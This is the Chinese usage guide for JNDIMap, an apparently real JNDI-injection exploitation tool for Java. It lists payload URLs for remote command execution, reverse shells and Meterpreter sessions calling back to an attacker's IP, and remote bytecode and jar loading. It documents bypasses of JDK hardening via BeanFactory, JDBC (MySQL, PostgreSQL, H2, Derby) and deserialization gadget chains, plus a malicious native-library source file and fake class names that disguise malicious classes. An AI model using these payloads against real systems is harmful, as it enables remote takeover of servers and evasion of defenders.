# 📖 使用指南

简体中文 | [English](USAGE.en.md)

## Usage

```bash
Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-s <ldapsPort>] [-p <httpPort>] [-j <jksPath>] [-k <jksPin>] [-u <url>] [-f <file>] [-useReferenceOnly] [-fakeClassName] [-h]
````

`-i`: 服务器监听 IP (即 codebase, 必须指定为一个目标可访问到的 IP, 例如 `192.168.1.100`, 不能用 `0.0.0.0`)

`-r`: RMI 服务器监听端口, 默认为 `1099`

`-l`: LDAP 服务器监听端口, 默认为 `1389`

`-s`: LDAPS 服务器监听端口, 默认为 `1636`

`-p`: HTTP 服务器监听端口, 默认为 `3456`

`-j`: LDAPS JKS 证书路径

`-k`: LDAPS JKS 证书密码, 默认为空

`-u`: 手动指定 JNDI 路由, 例如 `/Basic/Command/open -a Calculator` (某些场景的 JNDI URL 并不完全可控)

`-f`: JS 脚本路径, 用于编写自定义 JNDI Payload

`-useReferenceOnly`: 仅适用于 LDAP 协议, 通过 LDAP 相关参数直接返回 Reference 对象, 用于绕过 `com.sun.jndi.ldap.object.trustSerialData`

`-fakeClassName`: 在生成恶意 Java 类时使用随机虚假类名, 该类名与真实项目高度相似

`-h`: 显示 Usage 信息

## URL 格式

注意传入的 Base64 均为 **Base64 URL 编码**, 即把 `+` 和 `/` 替换为 `-` 和 `_`

大部分参数均支持自动 Base64 URL 解码, 即可以直接传入明文 (命令/IP/端口/URL) 或 Base64 URL 编码后的内容 (部分路由只接受 Base64 URL 编码后的参数, 下文会特别注明)

以下路由除 `/Deserialize/*` (LDAP 反序列化) 以外, 均支持 RMI, LDAP 和 LDAPS 协议

对于 RMI 协议, 只需要将 `ldap://127.0.0.1:1389/` 替换为 `rmi://127.0.0.1:1099/` 即可

对于 LDAPS 协议, 只需要将 `ldap://127.0.0.1:1389/` 替换为 `ldaps://127.0.0.1:1636/` 即可

## Basic 功能

直接通过 JNDI Reference 类加载远程 Java 字节码

Java 版本需小于 8u121 (RMI 协议) 或 8u191 (LDAP 协议)

```bash
# 发起 DNS 请求
ldap://127.0.0.1:1389/Basic/DNSLog/xxx.dnslog.cn
ldap://127.0.0.1:1389/Basic/DNSLog/eHh4LmRuc2xvZy5jbg==

# 命令执行
ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y

# 加载自定义 Java 字节码

# URL 传参加载
ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
# 从运行 JNDIMap 的服务器上加载
ldap://127.0.0.1:1389/Basic/FromFile/Evil.class # 相对于当前路径
ldap://127.0.0.1:1389/Basic/FromFile/<base64-url-encoded-path-to-evil-class-file>

# 反弹 Shell (支持 Windows)
ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==

# 反弹 Meterpreter (java/meterpreter/reverse_tcp)
ldap://127.0.0.1:1389/Basic/Meterpreter/127.0.0.1/4444
ldap://127.0.0.1:1389/Basic/Meterpreter/MTI3LjAuMC4x/NDQ0NA==
```

## BeanFactory Bypass

基于 BeanFactory 绕过高版本 JDK 限制, Tomcat 版本需小于 8.5.79 或 9.0.63

支持如下绕过方式:

- Tomcat ELProcessor
- Groovy ClassLoader/Shell
- XStream
- SnakeYaml
- BeanShell
- MVEL
- MLet
- NativeLibLoader

*上述方式除 MLet 和 NativeLibLoader 外, 均支持 Basic 模块所有功能*

### Tomcat ELProcessor

利用 `javax.el.ELProcessor` 执行 EL 表达式

```bash
# Tomcat Bypass
ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator
```

### Groovy ClassLoader/Shell

利用 `groovy.lang.GroovyClassLoader` 和 `groovy.lang.GroovyShell` 执行 Groovy 脚本

```bash
# GroovyClassLoader
ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator

# GroovyShell
ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
```

### XStream

利用 XStream 反序列化实现 RCE

反序列化部分使用 UIDefaults + SwingLazyValue 依次触发下列 Gadget:

- 任意文件写: `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename`
- XSLT 加载: `com.sun.org.apache.xalan.internal.xslt.Process._main`

XSLT Payload 部分使用了 Spring 的反射库调用 defineClass, 因此需要依赖 Spring 环境

```bash
# XStream Bypass (依赖 Spring)
# 基于任意文件写 + XSLT 加载, 因为先后顺序问题有概率失败, 需要多试几次
ldap://127.0.0.1:1389/XStream/Command/open -a Calculator
````

### SnakeYaml

利用 SnakeYaml 反序列化实现 RCE

反序列化部分使用 URLClassLoader 加载 `javax.script.ScriptEngineManager` SPI 实现类, 内部会通过 ScriptEngine 执行 JS 代码

```bash
# SnakeYaml Bypass
ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
```

### BeanShell

利用 `bsh.Interpreter.eval` 执行 BeanShell 脚本

```bash
# BeanShell Bypass
ldap://127.0.0.1:1389/BeanShell/Command/open -a Calculator
```

### MVEL

利用 `org.mvel2.sh.ShellSession.exec` 方法执行 MVEL 表达式

```bash
# MVEL Bypass
ldap://127.0.0.1:1389/MVEL/Command/open -a Calculator
```

### MLet

利用 `javax.management.loading.MLet` 的 loadClass 和 addURL 方法探测 classpath 中存在的类

如果 `com.example.TestClass` 这个类存在, 则 HTTP 服务器会接收到一个 `/com/example/TestClass_exists.class` 请求

```bash
# MLet
ldap://127.0.0.1:1389/MLet/com.example.TestClass
```

### NativeLibLoader

利用 `com.sun.glass.utils.NativeLibLoader.loadLibrary` 方法加载目标服务器上的本地库

需要先提前以其它方式在目标机器上写入 dll/so/dylib

注意传入的 path 为绝对路径, 且不能包含后缀名

例如: 服务器上存在 `/tmp/evil.so`, 则 path 为 `/tmp/evil`

```bash
# NativeLibLoader
ldap://127.0.0.1:1389/NativeLibLoader/<base64-url-encoded-path-to-native-library>
```

本地库源码

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("open -a Calculator");
}
```

编译

```bash
# macOS
gcc -shared -fPIC exp.c -o exp.dylib

# Linux
gcc -shared -fPIC exp.c -o exp.so
```

## JDBC RCE

支持以下数据库连接池的 JDBC RCE

- Commons DBCP
- Tomcat DBCP
- Tomcat JDBC
- Alibaba Druid
- HikariCP

需要将 URL 中的 `Factory` 替换为如下内容之一

- CommonsDBCP1
- CommonsDBCP2
- TomcatDBCP1
- TomcatDBCP2
- TomcatJDBC
- Druid
- HikariCP

### MySQL

#### MySQL JDBC 反序列化 RCE

```bash
# detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize1/127.0.0.1/3306/root

# ServerStatusDiffInterceptor

# 5.1.11-5.1.48
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize2/127.0.0.1/3306/root

# 6.0.2-6.0.6
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize3/127.0.0.1/3306/root

# 8.0.7-8.0.19
ldap://127.0.0.1:1389/Factory/MySQL/Deserialize4/127.0.0.1/3306/root
```

JDBC URL (供参考)

```bash
# detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=123

# ServerStatusDiffInterceptor

# 5.1.11-5.1.48
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=test

# 6.0.2-6.0.6
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test

# 8.0.7-8.0.19
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test
```

#### MySQL 客户端任意文件读取

```bash
# 全版本
ldap://127.0.0.1:1389/Factory/MySQL/FileRead/127.0.0.1/3306/root
```

JDBC URL (供参考)

```bash
# 全版本
jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360
```

上述两种方式均需要搭配恶意 MySQL 服务端使用

[https://github.com/4ra1n/mysql-fake-server](https://github.com/4ra1n/mysql-fake-server)

[https://github.com/rmb122/rogue_mysql_server](https://github.com/rmb122/rogue_mysql_server)

[https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)

### PostgreSQL

通过 PostgreSQL JDBC URL 的 socketFactory 和 socketFactoryArg 参数实例化 ClassPathXmlApplicationContext 实现 RCE

```bash
# 命令执行
ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator

# 反弹 Shell
ldap://127.0.0.1:1389/Factory/PostgreSQL/ReverseShell/127.0.0.1/4444
````

### H2

通过 H2 JDBC URL 的 INIT 参数执行 SQL 语句, 支持命令执行和反弹 Shell

三种方式 RCE: CREATE ALIAS + Java/Groovy, CREATE TRIGGER + JavaScript

```bash
# 命令执行
ldap://127.0.0.1:1389/Factory/H2/Java/Command/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/Groovy/Command/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/JavaScript/Command/open -a Calculator

# 反弹 Shell
ldap://127.0.0.1:1389/Factory/H2/Java/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Factory/H2/Groovy/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
```

此外, JNDIMap 还支持 **JRE** 环境的 H2 RCE

*Java 15 及以上版本删除了 Nashorn JS 引擎, 同时 JRE 环境本身不包含 javac 命令, 因此无法使用 Java/JavaScript 方式实现 RCE*

```bash
# 基于 MidiSystem.getSoundbank 方法, 仅需 JRE + H2 依赖
ldap://127.0.0.1:1389/Factory/H2/JRE/Soundbank/Command/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/JRE/Soundbank/ReverseShell/127.0.0.1/4444

# 基于 ClassPathXmlApplicationContext, 需要 Spring 依赖
ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/Command/open -a Calculator
ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/ReverseShell/127.0.0.1/4444
```

### Derby

#### Derby SQL RCE

支持命令执行和反弹 Shell

```bash
# 1. 加载远程 jar 并创建相关存储过程 (会自动创建数据库)
ldap://127.0.0.1:1389/Factory/Derby/Install/<database>

# 2. 命令执行/反弹 Shell
ldap://127.0.0.1:1389/Factory/Derby/Command/<database>/open -a Calculator
ldap://127.0.0.1:1389/Factory/Derby/ReverseShell/<database>/ReverseShell/127.0.0.1/4444

# 3. 删除数据库以释放内存
ldap://127.0.0.1:1389/Factory/Derby/Drop/<database>
```

注意 HikariCP/TomcatJDBC 的 connectionInitSql/initSQL 参数不支持一次性执行多条 SQL 语句, 因此上述 **Install** 过程需要分开写, 以 HikariCP 为例

```bash
# 1. 加载远程 jar (会自动创建数据库)
ldap://127.0.0.1:1389/HikariCP/Derby/InstallJar/<database>

# 2. 将 jar 加入 classpath
ldap://127.0.0.1:1389/HikariCP/Derby/AddClassPath/<database>

# 3. 创建命令执行的存储过程
ldap://127.0.0.1:1389/HikariCP/Derby/CreateCmdProc/<database>

# 4. 创建反弹 Shell 的存储过程
ldap://127.0.0.1:1389/HikariCP/Derby/CreateRevProc/<database>

# 后续 JNDI URL 同上
```

为了防止恶意 jar 落地, JNDIMap 选择使用 `jdbc:derby:memory:<database>` 形式的 JDBC URL 以在内存中创建数据库

因此最好不要多次执行 Install/InstallJar 路由, 并且记得 Drop 数据库以释放内存

#### Derby 主从复制反序列化 RCE

JNDI 本身就支持反序列化, 意义不大, 可能在某些比较极限的场景下有用 (例如过滤了 LDAP 协议, 仅支持 RMI)

```bash
# 1. 创建内存数据库
ldap://127.0.0.1:1389/Factory/Derby/Create/<database>

# 2. 使用 JNDIMap 快速启动恶意 Derby Server
java -cp JNDIMap.jar map.jndi.server.DerbyServer -g "/CommonsCollectionsK1/Command/open -a Calculator"

# 3. 指定 Slave 信息, database 即为上面创建的数据库名称
ldap://127.0.0.1:1389/Factory/Derby/Slave/<ip>/<port>/<database>
```

启动内置的恶意 Derby Server

```bash
Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>] [-f <file>] [-h]
```

`-p`: Derby Server 监听端口, 默认为 `4851`

`-g`: 指定 Gadget, 如 `/CommonsCollectionsK1/Command/open -a Calculator` (即下文 `/Deserialize/*` 系列路由)

`-f`: 指定自定义序列化数据文件

`-h`: 显示 Usage 信息

### LDAP Deserialization

通过 LDAP、LDAPS 协议触发 Java 反序列化, 不支持 RMI 协议

JNDIMap 内置以下利用链, 同时也支持反序列化自定义数据

- CommonsCollections K1-K4
- CommonsBeanutils183
- CommonsBeanutils194
- Fastjson1 (1.2.x)
- Fastjson2 (2.0.x)
- Jackson

```bash
# 自定义数据反序列化

# URL 传参加载
ldap://127.0.0.1:1389/Deserialize/FromUrl/<base64-url-encoded-serialize-data>
# 从运行 JNDIMap 的服务器上加载
ldap://127.0.0.1:1389/Deserialize/FromFile/payload.ser # 相对于当前路径
ldap://127.0.0.1:1389/Deserialize/FromFile/<base64-url-encoded-path-to-serialized-data>

# CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行和反弹 Shell
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444

# CommonsCollectionsK2 反序列化 (4.0 + TemplatesImpl), 功能同上
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculator

# CommonsCollectionsK3 反序列化 (3.1 + Runtime.exec), 仅支持命令执行
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator

# CommonsCollectionsK4 反序列化 (4.0 + Runtime.exec), 功能同上
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator

# CommonsBeanutils 反序列化
# 无需 commons-collections 依赖, 使用 TemplatesImpl, 支持命令执行和反弹 Shell
# 根据 BeanComparator serialVersionUID 不同, 分为两个版本: 1.8.3 和 1.9.4

# 1.8.3
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444

# 1.9.4
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444

# Jackson 反序列化
# 使用 JdkDynamicAopProxy 优化不稳定性问题, 需要 spring-aop 依赖
ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444

# Fastjson 反序列化

# Fastjson1: 全版本 (1.2.x)
ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/Fastjson1/ReverseShell/127.0.0.1/4444

# Fastjson2: <= 2.0.26
ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
```

## Script

JNDIMap 支持使用 Nashorn JavaScript 引擎 (基于 ES5) 编写自定义 JNDI Payload 脚本

以 H2 RCE 为例

```javascript
var Reference = Java.type("javax.naming.Reference");
var StringRefAddr = Java.type("javax.naming.StringRefAddr");

var list = [];
list.push("CREATE ALIAS EXEC AS 'String cmd_exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return \"test\";}'");
list.push("CALL EXEC('" + args + "')"); // 参数通过 args 变量传入

var url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=" + list.join(";") + ";";

var ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
ref.add(new StringRefAddr("jdbcUrl", url));

ref; // 返回 Reference 对象
```

运行 JNDIMap

```bash
java -jar JNDIMap.jar -f /path/to/evil.js
```

通过以下 JNDI URL 实现 RCE

```bash
# 支持手动向 JS 脚本传入参数
ldap://127.0.0.1:1389/Script/<args>
```

如果在某些情况下, 无法完全控制 JNDI URL, 可以指定 `-u` 参数

```bash
java -jar JNDIMap.jar -f /path/to/evil.js -u "/Script/open -a Calculator"
```

然后通过任意 JNDI URL 触发

```bash
ldap://127.0.0.1:1389/x
```

## useReferenceOnly

对于 LDAP 协议的 JNDI 注入, 如果想要利用 ObjectFactory 绕过, 目前已有的方法都是将 LDAP 协议返回的 javaSerializedData 属性设置为 Reference 对象的序列化数据

但是自 JDK 21 开始 `com.sun.jndi.ldap.object.trustSerialData` 参数默认为 false, 即无法通过 LDAP 协议触发反序列化, 也就无法通过上面的方法解析 Reference 对象

不过我们仍然可以设置相关的 LDAP 参数, 使得服务端直接返回 Reference 对象, 因为这个过程没有涉及到反序列化, 所以也就绕过了 trustSerialData 参数的限制

具体实现如下

```java
public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
    // ......

    Reference ref = (Reference) result;
    e.addAttribute("objectClass", "javaNamingReference");
    e.addAttribute("javaClassName", ref.getClassName());
    e.addAttribute("javaFactory", ref.getFactoryClassName());

    Enumeration<RefAddr> enumeration = ref.getAll();
    int posn = 0;

    while (enumeration.hasMoreElements()) {
        StringRefAddr addr = (StringRefAddr) enumeration.nextElement();
        e.addAttribute("javaReferenceAddress", "#" + posn + "#" + addr.getType() + "#" + addr.getContent());
        posn ++;
    }

    // ......
}
```

使用时指定 `-useReferenceOnly` 参数即可

```bash
java -jar JNDIMap.jar -useReferenceOnly
```

## fakeClassName

JNDIMap 的 [classNames](src/main/resources/classNames) 目录中包含了一些与真实项目高度相似的虚假类名, 这些类名基于 [ClassNameObfuscator](https://github.com/X1r0z/ClassNameObfuscator) 项目生成, 可用于 JNDI 注入中生成恶意 Java 类的相关场景

使用时指定 `-fakeClassName` 参数即可

```bash
java -jar JNDIMap.jar -fakeClassName
```

当未指定 `-fakeClassName` 参数时, JNDIMap 会生成符合 `[A-Z]{1}[A-Za-z0-9]{7}` 格式的随机字符串作为恶意类的类名
